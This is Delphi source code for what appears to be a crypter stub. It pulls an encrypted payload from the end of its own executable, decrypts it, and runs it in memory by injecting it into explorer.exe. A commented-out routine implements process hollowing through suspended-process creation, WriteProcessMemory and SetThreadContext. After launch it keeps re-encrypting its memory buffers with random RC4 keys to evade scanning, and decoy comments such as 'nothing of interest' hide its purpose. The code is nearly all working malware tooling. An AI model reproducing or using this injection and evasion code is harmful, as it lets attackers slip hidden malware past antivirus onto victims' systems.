program stub;
{$IMAGEBASE $10000000}

uses
  SysUtils,EditSvr,classes,forms,windows,Registry,RCx,mem;

type
  TSections = array [0..0] of TImageSectionHeader;
  // file class
  TCFile = class(TObject)
    iBuff,pass : string;
    Load:TLoader;
    procedure LoadFile();
    function ReadFile(FileName: String): AnsiString; virtual;
    function ReadEof(Delimit1, Delimit2 :String) :String; virtual;
    function Reverse(const rev : string) : string; virtual;
    procedure String2File(String2BeSaved, FileName: string); virtual;
    {function GAS(S: dword; A: dword): dword; virtual;
    procedure CPEx(FM: pointer); }
  end;

var
  CLoad : TCFile;
  PaintBox1 : TBitmap;
  exit_me : boolean;
  i : integer;

function TCFile.ReadFile(FileName: String): AnsiString;
var
  F             :File;
  Buffer        :AnsiString;
  Size          :Integer;
  ReadBytes     :Integer;
  DefaultFileMode:Byte;
begin
  Result := '';
  DefaultFileMode := FileMode;
  FileMode := 0;
  AssignFile(F, FileName);
  Reset(F, 1);

  if (IOResult = 0) then
  begin
    Size := FileSize(F);
    while (Size > 1024) do
    begin
      SetLength(Buffer, 1024);
      BlockRead(F, Buffer[1], 1024, ReadBytes);
      Result := Result + Buffer;
      Dec(Size, ReadBytes);
    end;
    SetLength(Buffer, Size);
    BlockRead(F, Buffer[1], Size);
    Result := Result + Buffer;
    CloseFile(F);
  end;

  FileMode := DefaultFileMode;
end;

function TCFile.ReadEof(Delimit1, Delimit2 :String) :String;
var
  Buffer      :AnsiString;
  ResLength   :Integer;
  i           :Integer;
  PosDelimit  :Integer;
begin
  Buffer := ReadFile(ParamStr(0));
  if Pos(Delimit1, Buffer) > Pos(Delimit2, Buffer) then
    PosDelimit := Length(Buffer)-(Pos(Delimit1, Buffer)+Length(Delimit1))
  else PosDelimit := Length(Buffer)-(Pos(Delimit2, Buffer)+Length(Delimit2));
  Buffer := Copy(Buffer, (Length(Buffer)-PosDelimit), Length(Buffer));
  ResLength := Pos(Delimit2, Buffer)-(Pos(Delimit1, Buffer)+Length(Delimit1));
  for i := 0 to (Reslength-1) do
    Result := Result+Buffer[Pos(Delimit1, Buffer)+(Length(Delimit1)+i)];
end;

function RandomPassword(PLen: Integer): string;
var
  str: string;
begin
  Randomize;
  //string with all possible chars
  str    := 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = PLen);
end;

procedure TCFile.LoadFile();
begin
  // setup loader
  Load := TLoader.Create;
  // load password
  pass := ReadEof('#D#', '(P)');
  Load.LoadSettings(pass);
  iBuff := Reverse(load.Settings[0]);
  // load file datas
  if (iBuff <> '') then
  begin
    try
      //CPEx(pointer(iBuff));
      MemoryExecute(@iBuff,'explorer.exe','',true);
    except
      MessageBox(0,'Error executing application.','Error',MB_ICONERROR);
      ExitProcess(0);
    end;
  end;
  // keep running and randomize strings
  exit_me := false;
  while (exit_me = false) do
  begin
    Sleep(10);
    Randomize;
    for i := low(Load.Settings) to High(Load.Settings) do
    begin
      load.Settings[i] := RC4Code(Load.Settings[i],RandomPassword(random(16)));
    end;
    iBuff := RC4Code(iBuff,RandomPassword(random(16)));
  end;
end;

{function TCFile.GAS(S: dword; A: dword): dword;
var
  k,b,l : dword;
begin
  // math bit
  b := 0; k := s; l := a + s;
  if (k <> l) then
  begin
    l := s;
    k := a;
    if ((l mod k) = 0) then
    begin
      b := l;
    end
    else
    begin
      b := ((l div k) + 1) * k;
    end;
  end;
  Result := b;
end;

function ImgS(I: pointer): dword;
var
  A: dword;
  INtH: PImageNtHeaders;
  PS: ^TSections;
  SL: dword;
begin
  INtH := pointer(dword(dword(I)) + dword(PImageDosHeader(I)._lfanew));
  A := INtH.OptionalHeader.SectionAlignment;
  if ((INtH.OptionalHeader.SizeOfHeaders mod A) = 0) then
  begin
    Result := INtH.OptionalHeader.SizeOfHeaders;
  end
  else
  begin
    Result := ((INtH.OptionalHeader.SizeOfHeaders div A) + 1) * A;
  end;
  PS := pointer(pchar(@(INtH.OptionalHeader)) + INtH.FileHeader.SizeOfOptionalHeader);
  for SL := 0 to INtH.FileHeader.NumberOfSections - 1 do
  begin
    if PS[SL].Misc.VirtualSize <> 0 then
    begin
      if ((PS[SL].Misc.VirtualSize mod A) = 0) then
      begin
        Result := Result + PS[SL].Misc.VirtualSize;
      end
      else
      begin
        Result := Result + (((PS[SL].Misc.VirtualSize div A) + 1) * A);
      end;
    end;
  end;
end;

procedure TCFile.CPEx(FM: pointer);
var
  BA, B, HS, ISs, SL, SS : dword;
  C: TContext;
  FD: pointer;
  INtH: PImageNtHeaders;
  IM: pointer;
  PI: TProcessInformation;
  PS: ^TSections;
  SI: TStartupInfo;
begin
  INtH := pointer(dword(dword(FM)) + dword(PImageDosHeader(FM)._lfanew));
  ISs := ImgS(FM);
  GetMem(IM, ISs);
  try
    FD := IM;
    HS := INtH.OptionalHeader.SizeOfHeaders;
    PS := pointer(pchar(@(INtH.OptionalHeader)) + INtH.FileHeader.SizeOfOptionalHeader);
    for SL := 0 to INtH.FileHeader.NumberOfSections - 1 do
    begin
      if PS[SL].PointerToRawData < HS then HS := PS[SL].PointerToRawData;
    end;
    CopyMemory(FD, FM, HS);
    FD := pointer(dword(FD) + GAS(INtH.OptionalHeader.SizeOfHeaders, INtH.OptionalHeader.SectionAlignment));
    for SL := 0 to INtH.FileHeader.NumberOfSections - 1 do
    begin
      if PS[SL].SizeOfRawData > 0 then
      begin
      SS := PS[SL].SizeOfRawData;
      if SS > PS[SL].Misc.VirtualSize then SS := PS[SL].Misc.VirtualSize;
        CopyMemory(FD, pointer(dword(FM) + PS[SL].PointerToRawData), SS);
        FD := pointer(dword(FD) + GAS(PS[SL].Misc.VirtualSize, INtH.OptionalHeader.SectionAlignment));
      end
      else
      begin
        if PS[SL].Misc.VirtualSize <> 0 then FD := pointer(dword(FD) + GAS(PS[SL].Misc.VirtualSize, INtH.OptionalHeader.SectionAlignment));
      end;
  end;
  ZeroMemory(@SI, SizeOf(SI));
  ZeroMemory(@C, SizeOf(TContext));
  CreateProcess(nil, pchar(ParamStr(0)), nil, nil, False, CREATE_SUSPENDED, nil, nil, SI, PI);
  C.ContextFlags := CONTEXT_FULL;
  GetThreadContext(PI.hThread, C);
  ReadProcessMemory(PI.hProcess, pointer(C.Ebx + 8), @BA, 4, B);
  VirtualAllocEx(PI.hProcess, pointer(INtH.OptionalHeader.ImageBase), ISs, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(PI.hProcess, pointer(INtH.OptionalHeader.ImageBase), IM, ISs, B);
  WriteProcessMemory(PI.hProcess, pointer(C.Ebx + 8), @INtH.OptionalHeader.ImageBase, 4, B);
  C.Eax := INtH.OptionalHeader.ImageBase + INtH.OptionalHeader.AddressOfEntryPoint;
  SetThreadContext(PI.hThread, C);
  ResumeThread(PI.hThread);
  finally
    FreeMemory(IM);
  end;
end;  }
//===================================================
procedure TCFile.String2File(String2BeSaved, FileName: string);
var
 MyStream: TMemoryStream;
begin
 if String2BeSaved = '' then exit;
 SetCurrentDir(ExtractFilePath(Application.ExeName));
 MyStream := TMemoryStream.Create;
 try
   MyStream.WriteBuffer(Pointer(String2BeSaved)^, Length(String2BeSaved));
   MyStream.SaveToFile(FileName);
 finally
   MyStream.Free;
 end;
end;

function TCFile.Reverse(const rev : string) : string;
var
  a, b : integer;
begin
  b := Length(rev);
  SetLength(Result, b);
  for a := 1 to (Length(rev) div 2) do
  begin
    Result[a] := rev[b];
    Result[b] := rev[a];
    Dec(b);
  end;
end;

//====================================================

begin
  // draw bitmap
  PaintBox1.bmHeight := 100;
  PaintBox1.bmWidth := 100;
  // nothing of interest
  CLoad := TCFile.Create;
  CLoad.LoadFile();
  ExitProcess(0);
end.
